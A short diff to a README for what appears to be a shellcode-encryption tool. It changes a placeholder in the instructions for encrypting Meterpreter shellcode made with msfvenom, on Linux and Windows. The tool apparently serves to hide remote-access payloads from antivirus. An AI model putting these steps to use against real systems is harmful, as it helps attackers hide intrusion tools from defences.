@@ -62,7 +62,7 @@ To generate the shellcode type in the terminal: ``` msfvenom -p windows/meterpre
 
 To encrypt shellcode use the encrypt_shellcode script.                                                                                   
 On linux type: ``` ./encrypt_shellcode e "(KEY, ex: "\xda\xe6\x1d\x5c\x9v\x8d") "(shellcode)"" ```                                      
-On windows type: ``` encrypt_shellcode.exe e "(KEY, ex: "\xda\xe6\x1d\x5c\x9v\x8d") "(shellcode)"" ```
+On windows type: ``` encrypt_shellcode.exe e "(KEY, ex: "\xda\xe6\x1d\x5c\x9v\x8d") "(YOUR_SHELLCODE)"" ```
 
 
 
